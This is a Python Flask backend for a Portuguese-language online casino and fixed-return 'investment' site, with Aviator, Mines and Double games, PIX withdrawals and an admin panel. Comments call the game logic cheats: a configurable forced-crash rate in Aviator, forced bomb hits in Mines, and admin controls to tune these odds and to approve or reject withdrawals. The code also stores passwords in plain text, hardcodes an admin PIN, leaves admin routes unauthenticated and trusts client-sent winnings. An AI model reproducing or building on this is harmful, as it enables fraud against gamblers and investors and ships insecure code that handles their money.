from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_sqlalchemy import SQLAlchemy
import datetime
import os
import random
import time
import uuid

# --- CONFIGURAÇÃO INICIAL ---
basedir = os.path.abspath(os.path.dirname(__file__))
app = Flask(__name__)
# Usamos SQLite. Em produção no Render, lembre-se que o SQLite reseta se o deploy for redeployed.
# Para produção real, recomenda-se PostgreSQL, mas para seu teste funciona.
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(basedir, 'nexus.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.secret_key = "nexus_secret_key_pro_v1"

db = SQLAlchemy(app)
CORS(app, resources={r"/*": {"origins": "*"}}) # Libera geral para evitar erro de CORS

ADMIN_PIN = "1234" # Seu PIN de admin

# ==========================================
#               BANCO DE DADOS
# ==========================================

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)
    balance = db.Column(db.Float, default=0.0)
    vip_level = db.Column(db.String(50), default='Iniciante') # Iniciante, VIP, Magnata

class Plan(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(50), nullable=False)
    duration_minutes = db.Column(db.Integer, nullable=False)
    total_rate = db.Column(db.Float, nullable=False) # Ex: 0.10 para 10%
    min_entry = db.Column(db.Float, default=30.0)

class Investment(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    plan_name = db.Column(db.String(50))
    amount = db.Column(db.Float, nullable=False)
    start_date = db.Column(db.DateTime, default=datetime.datetime.now)
    end_date = db.Column(db.DateTime, nullable=False)
    final_return = db.Column(db.Float, nullable=False)
    # Status: 'ativo' (rodando), 'finalizado' (tempo acabou, esperando saque), 'pago' (dinheiro na conta)
    status = db.Column(db.String(20), default='ativo') 

class Withdrawal(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    username = db.Column(db.String(80))
    amount = db.Column(db.Float, nullable=False)
    pix_key = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(20), default='pendente')
    date = db.Column(db.DateTime, default=datetime.datetime.now)

# Configurações globais dos jogos e probabilidades (A "Banca")
class GameConfig(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    # Double
    mult_black = db.Column(db.Float, default=2.0)
    mult_red = db.Column(db.Float, default=2.0)
    mult_white = db.Column(db.Float, default=14.0)
    chance_white = db.Column(db.Float, default=10.0) # % de vir branco
    
    # Aviator (Trapaças)
    aviator_house_edge = db.Column(db.Float, default=30.0) # % de chance de quebrar baixo (1.00x - 1.20x)
    aviator_max_mult = db.Column(db.Float, default=10.0)   # Multiplicador máximo permitido antes de forçar crash
    
    # Mines (Trapaças)
    mines_force_loss = db.Column(db.Float, default=20.0)   # % de chance de explodir na próxima jogada independente da logica

class SystemStatus(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    active_invest = db.Column(db.Boolean, default=True)
    active_double = db.Column(db.Boolean, default=True)
    active_mines = db.Column(db.Boolean, default=True)   # Novo
    active_aviator = db.Column(db.Boolean, default=True) # Novo

# Histórico de partidas (opcional, bom para logs)
class GameHistory(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    game = db.Column(db.String(20)) # double, mines, aviator
    user_id = db.Column(db.Integer)
    bet = db.Column(db.Float)
    win = db.Column(db.Float) # 0 se perdeu
    timestamp = db.Column(db.DateTime, default=datetime.datetime.now)

# ==========================================
#               INICIALIZAÇÃO
# ==========================================

with app.app_context():
    db.create_all()
    # Cria planos padrão se não existirem
    if not Plan.query.first():
        db.session.add(Plan(name="Start Fast", duration_minutes=60, total_rate=0.02, min_entry=20)) # 2% em 1h
        db.session.add(Plan(name="Lucro 24h", duration_minutes=1440, total_rate=0.10, min_entry=50)) # 10% em 24h
    if not GameConfig.query.first():
        db.session.add(GameConfig())
    if not SystemStatus.query.first():
        db.session.add(SystemStatus())
    db.session.commit()

# ==========================================
#               AUXILIARES
# ==========================================

def check_maintenance(game_type):
    status = SystemStatus.query.first()
    if game_type == 'invest' and not status.active_invest: return True
    if game_type == 'double' and not status.active_double: return True
    if game_type == 'mines' and not status.active_mines: return True
    if game_type == 'aviator' and not status.active_aviator: return True
    return False

# Rota Health Check para o Loading Screen saber que o servidor acordou
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "ok", "timestamp": time.time()})

# ==========================================
#               ROTAS DE USUÁRIO
# ==========================================

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    user = User.query.filter_by(username=data['login']).first()
    if user and user.password == data['password']:
        return jsonify({
            "id": user.id, 
            "username": user.username, 
            "balance": user.balance, 
            "vip_level": user.vip_level
        })
    return jsonify({"erro": True, "msg": "Credenciais inválidas"}), 401

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    if User.query.filter_by(username=data['username']).first():
        return jsonify({"erro": True, "msg": "Usuário já existe"}), 400
    if User.query.filter_by(email=data['email']).first():
        return jsonify({"erro": True, "msg": "Email já cadastrado"}), 400
        
    new_user = User(username=data['username'], email=data['email'], password=data['password'])
    db.session.add(new_user)
    db.session.commit()
    return jsonify({"success": True})

@app.route('/user/<int:user_id>', methods=['GET'])
def get_user(user_id):
    u = User.query.get(user_id)
    if not u: return jsonify({"erro": True}), 404
    
    # Atualiza status dos investimentos (mas não paga ainda)
    update_investments_status(user_id)
    
    return jsonify({
        "id": u.id, 
        "balance": u.balance, 
        "vip_level": u.vip_level, 
        "username": u.username
    })

# ==========================================
#           SISTEMA DE INVESTIMENTO
# ==========================================

def update_investments_status(user_id):
    # Verifica se o tempo acabou e muda para 'finalizado' (pronto para saque)
    invs = Investment.query.filter_by(user_id=user_id, status='ativo').all()
    now = datetime.datetime.now()
    changed = False
    for i in invs:
        if now >= i.end_date:
            i.status = 'finalizado' # Libera o botão de saque no front
            changed = True
    if changed:
        db.session.commit()

@app.route('/plans', methods=['GET'])
def get_plans():
    plans = Plan.query.all()
    return jsonify([{
        "id": p.id, "name": p.name, "min": p.min_entry, 
        "minutes": p.duration_minutes, "rate": p.total_rate
    } for p in plans])

@app.route('/investir', methods=['POST'])
def investir():
    if check_maintenance('invest'): return jsonify({"success": False, "msg": "Investimentos em manutenção!"})

    data = request.json
    user = User.query.get(data['user_id'])
    plan = Plan.query.get(data['plan_id'])
    amount = float(data['amount'])

    if user.balance < amount: return jsonify({"success": False, "msg": "Saldo insuficiente"}), 400

    # Lógica de lucro
    final_return = amount + (amount * plan.total_rate)
    end_date = datetime.datetime.now() + datetime.timedelta(minutes=plan.duration_minutes)

    inv = Investment(
        user_id=user.id, 
        plan_name=plan.name, 
        amount=amount, 
        end_date=end_date, 
        final_return=final_return,
        status='ativo'
    )
    user.balance -= amount
    db.session.add(inv)
    db.session.commit()
    return jsonify({"success": True, "msg": "Investimento iniciado! Acompanhe em tempo real."})

@app.route('/meus_investimentos/<int:user_id>', methods=['GET'])
def meus_investimentos(user_id):
    update_investments_status(user_id)
    invs = Investment.query.filter_by(user_id=user_id).order_by(Investment.start_date.desc()).all()
    
    # Retorna TS para o JS fazer a animação de contagem e dinheiro subindo
    return jsonify([{
        "id": i.id, 
        "plan": i.plan_name, 
        "amount": i.amount,
        "final_return": i.final_return,
        "start_ts": i.start_date.timestamp() * 1000,
        "end_ts": i.end_date.timestamp() * 1000,
        "status": i.status # ativo, finalizado, pago
    } for i in invs])

@app.route('/sacar_investimento', methods=['POST'])
def sacar_investimento():
    # Rota nova: O usuário clica no botão "SACAR" quando o status é 'finalizado'
    data = request.json
    inv_id = data.get('inv_id')
    user_id = data.get('user_id')
    
    inv = Investment.query.get(inv_id)
    user = User.query.get(user_id)
    
    if not inv or inv.user_id != user.id:
        return jsonify({"success": False, "msg": "Investimento não encontrado"})
    
    if inv.status != 'finalizado':
        return jsonify({"success": False, "msg": "Ainda em andamento ou já sacado."})
    
    # Efetua o pagamento
    user.balance += inv.final_return
    inv.status = 'pago'
    
    db.session.add(GameHistory(game='invest_profit', user_id=user.id, bet=inv.amount, win=inv.final_return))
    db.session.commit()
    
    return jsonify({
        "success": True, 
        "msg": f"Saque de R$ {inv.final_return:.2f} realizado!",
        "new_balance": user.balance
    })

# ==========================================
#           AVIATOR (INTEGRADO)
# ==========================================

@app.route('/game/aviator/play', methods=['POST'])
def aviator_play():
    if check_maintenance('aviator'): return jsonify({"success": False, "msg": "Aviator em manutenção"})
    
    data = request.json
    user = User.query.get(data['user_id'])
    bet = float(data['bet'])
    
    if user.balance < bet: return jsonify({"success": False, "msg": "Saldo insuficiente"})
    
    # Debita aposta
    user.balance -= bet
    
    # Lógica da Banca (Trapaça Controlada)
    cfg = GameConfig.query.first()
    
    # 1. Chance de crash instantâneo (House Edge)
    is_fraud = random.uniform(0, 100) < cfg.aviator_house_edge
    
    crash_point = 1.00
    if is_fraud:
        # Crash entre 1.00 e 1.10 (usuário perde quase certeza)
        crash_point = round(random.uniform(1.00, 1.10), 2)
    else:
        # Jogo justo (até o limite maximo)
        # Algoritmo simples de crash: E^x distribuicao
        # Para simplificar: Random weighted
        base = random.uniform(1, 100)
        if base > 90: crash_point = random.uniform(2.0, cfg.aviator_max_mult) # 10% chance de voo alto
        elif base > 60: crash_point = random.uniform(1.5, 3.0)
        else: crash_point = random.uniform(1.1, 1.8)
        
        # Trava de segurança da banca
        if crash_point > cfg.aviator_max_mult: crash_point = cfg.aviator_max_mult
        
    game_id = str(uuid.uuid4())
    # Em um app real, salvaríamos o 'crash_point' no banco atrelado ao game_id
    # Para simplificar aqui, vamos confiar no fluxo sincrono ou usar um cache simples
    # Vou retornar o crash_point criptografado ou hash? 
    # Melhor: O cliente recebe o crash_point, mas a animação é visual. 
    # Se o usuário inspecionar elemento, ele vê. 
    # PARA PRODUÇÃO SEGURA: O crash point fica no servidor e o cliente faz requests "tick" ou socket.
    # PARA ESTE MVP: Mandamos o crash_point e confiamos na UI, mas validamos o cashout.
    
    db.session.add(GameHistory(game='aviator', user_id=user.id, bet=bet, win=0)) # Registra aposta
    db.session.commit()
    
    return jsonify({
        "success": True, 
        "balance": user.balance,
        "crash_point": crash_point # O JS vai usar isso para decidir quando parar a animação se o user não clicar
    })

@app.route('/game/aviator/win', methods=['POST'])
def aviator_win():
    # Chamado se o usuário fizer cashout ANTES do crash_point (validado no front por enquanto)
    # *Nota de segurança*: Num cassino real, isso é validado via Socket. Aqui é REST.
    data = request.json
    user = User.query.get(data['user_id'])
    bet = float(data['bet'])
    mult = float(data['multiplier'])
    
    win_amount = bet * mult
    user.balance += win_amount
    
    # Atualiza histórico (opcional, seria update no ultimo id)
    db.session.commit()
    
    return jsonify({"success": True, "new_balance": user.balance})


# ==========================================
#           MINES (INTEGRADO)
# ==========================================

@app.route('/game/mines/play', methods=['POST'])
def mines_play():
    if check_maintenance('mines'): return jsonify({"success": False, "msg": "Mines em manutenção"})
    
    data = request.json
    user = User.query.get(data['user_id'])
    bet = float(data['bet'])
    
    if user.balance < bet: return jsonify({"success": False, "msg": "Saldo insuficiente"})
    user.balance -= bet
    db.session.commit()
    
    return jsonify({"success": True, "balance": user.balance})

@app.route('/game/mines/check', methods=['POST'])
def mines_check():
    # Cada clique no quadrado chama isso
    cfg = GameConfig.query.first()
    
    # Trapaça: Chance de explodir independente da logica real
    force_loss = random.uniform(0, 100) < cfg.mines_force_loss
    
    is_bomb = False
    if force_loss:
        is_bomb = True
    else:
        # Chance real baseada no numero de minas (simulado)
        # Se tem 3 minas em 25, chance é 3/25 = 12%
        mines_count = int(request.json.get('mines_count', 3))
        chance = (mines_count / 25.0) * 100
        if random.uniform(0, 100) < chance:
            is_bomb = True
            
    return jsonify({"bomb": is_bomb})

@app.route('/game/mines/cashout', methods=['POST'])
def mines_cashout():
    data = request.json
    user = User.query.get(data['user_id'])
    win_amount = float(data['win_amount'])
    
    user.balance += win_amount
    db.session.add(GameHistory(game='mines', user_id=user.id, bet=0, win=win_amount))
    db.session.commit()
    
    return jsonify({"success": True, "new_balance": user.balance})


# ==========================================
#           DOUBLE (LEGADO MELHORADO)
# ==========================================

@app.route('/game/double/spin', methods=['POST'])
def double_spin():
    if check_maintenance('double'): return jsonify({"success": False, "msg": "Double em manutenção!"})

    data = request.json
    user = User.query.get(data['user_id'])
    bet_amount = float(data['bet_amount'])
    bet_color = data['bet_color']

    if user.balance < bet_amount: return jsonify({"success": False, "msg": "Saldo insuficiente"})

    user.balance -= bet_amount
    cfg = GameConfig.query.first()
    
    # Logica de Probabilidade
    # Normalizamos as chances para 100% total
    total_w = cfg.chance_white + 45.0 + 45.0 # Supondo 45/45 padrão se não tiver config
    # Mas vamos usar fixo:
    r = random.uniform(0, 100)
    
    result_color = "black"
    if r < cfg.chance_white:
        result_color = "white"
    elif r < (cfg.chance_white + 45): # 45% chance red
        result_color = "red"
    # resto é black

    win_amount = 0
    is_win = False

    if result_color == bet_color:
        is_win = True
        if result_color == 'white': win_amount = bet_amount * cfg.mult_white
        elif result_color == 'red': win_amount = bet_amount * cfg.mult_red
        else: win_amount = bet_amount * cfg.mult_black
        
        user.balance += win_amount

    db.session.add(GameHistory(game='double', user_id=user.id, bet=bet_amount, win=win_amount))
    db.session.commit()

    return jsonify({
        "success": True, "result_color": result_color,
        "win": is_win, "win_amount": win_amount, "new_balance": user.balance
    })

# ==========================================
#           SAQUES E FINANCEIRO
# ==========================================

@app.route('/solicitar_saque', methods=['POST'])
def solicitar_saque():
    data = request.json
    user = User.query.get(data['user_id'])
    amount = float(data['amount'])

    if user.balance < amount: return jsonify({"success": False, "msg": "Saldo insuficiente."})

    user.balance -= amount
    wd = Withdrawal(user_id=user.id, username=user.username, amount=amount, pix_key=data['pix'])
    db.session.add(wd)
    db.session.commit()
    return jsonify({"success": True, "msg": "Solicitação enviada! Aguarde aprovação."})

# ==========================================
#               PAINEL ADMIN
# ==========================================

@app.route('/admin/auth', methods=['POST'])
def admin_auth():
    if request.json.get('pin') == ADMIN_PIN: return jsonify({"success": True})
    return jsonify({"success": False}), 403

@app.route('/admin/data', methods=['GET'])
def admin_data():
    # Dados agregados para o dashboard
    users = [{"id": u.id, "username": u.username, "balance": u.balance, "vip": u.vip_level} for u in User.query.all()]
    plans = [{"id": p.id, "name": p.name, "minutes": p.duration_minutes, "rate": p.total_rate, "min": p.min_entry} for p in Plan.query.all()]
    withdrawals = [{"id": w.id, "user": w.username, "amount": w.amount, "pix": w.pix_key, "status": w.status, "date": w.date.strftime('%Y-%m-%d %H:%M')} for w in Withdrawal.query.filter_by(status='pendente').all()]
    
    cfg = GameConfig.query.first()
    sys = SystemStatus.query.first()

    return jsonify({
        "users": users, 
        "plans": plans, 
        "withdrawals": withdrawals,
        "config": {
            "aviator_edge": cfg.aviator_house_edge,
            "aviator_max": cfg.aviator_max_mult,
            "mines_edge": cfg.mines_force_loss,
            "double_white": cfg.chance_white
        },
        "system": {
            "active_invest": sys.active_invest, 
            "active_double": sys.active_double,
            "active_mines": sys.active_mines,
            "active_aviator": sys.active_aviator
        }
    })

@app.route('/admin/toggle_system', methods=['POST'])
def toggle_system():
    data = request.json
    s = SystemStatus.query.first()
    val = data['val']
    
    if data['type'] == 'invest': s.active_invest = val
    if data['type'] == 'double': s.active_double = val
    if data['type'] == 'mines': s.active_mines = val
    if data['type'] == 'aviator': s.active_aviator = val
    
    db.session.commit()
    return jsonify({"success": True})

@app.route('/admin/save_config_games', methods=['POST'])
def save_config_games():
    data = request.json
    cfg = GameConfig.query.first()
    
    # Atualiza trapaças
    if 'aviator_edge' in data: cfg.aviator_house_edge = float(data['aviator_edge'])
    if 'aviator_max' in data: cfg.aviator_max_mult = float(data['aviator_max'])
    if 'mines_edge' in data: cfg.mines_force_loss = float(data['mines_edge'])
    if 'double_white' in data: cfg.chance_white = float(data['double_white'])
    
    db.session.commit()
    return jsonify({"success": True})

# Reutilizar as funções de User Action e Withdrawal Action do seu código original
@app.route('/admin/user_action', methods=['POST'])
def user_action():
    data = request.json
    u = User.query.get(data['id'])
    if 'vip' in data: u.vip_level = data['vip']
    if 'balance' in data: u.balance += float(data['balance'])
    db.session.commit()
    return jsonify({"success": True})

@app.route('/admin/withdrawal_action', methods=['POST'])
def withdrawal_action():
    data = request.json
    wd = Withdrawal.query.get(data['id'])
    if wd.status != 'pendente': return jsonify({"success": False})
    
    if data['action'] == 'approve':
        wd.status = 'aprovado'
    elif data['action'] == 'reject':
        wd.status = 'rejeitado'
        # Estorna
        u = User.query.get(wd.user_id)
        u.balance += wd.amount
        
    db.session.commit()
    return jsonify({"success": True})

@app.route('/admin/save_plan', methods=['POST'])
def save_plan():
    data = request.json
    if 'id' in data and data['id']:
        p = Plan.query.get(data['id'])
    else:
        p = Plan(); db.session.add(p)
    p.name = data['name'];
    p.duration_minutes = int(data['minutes']);
    p.total_rate = float(data['rate']);
    p.min_entry = float(data['min'])
    db.session.commit()
    return jsonify({"success": True})

@app.route('/admin/delete_plan/<int:id>', methods=['DELETE'])
def delete_plan(id):
    Plan.query.filter_by(id=id).delete()
    db.session.commit()
    return jsonify({"success": True})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
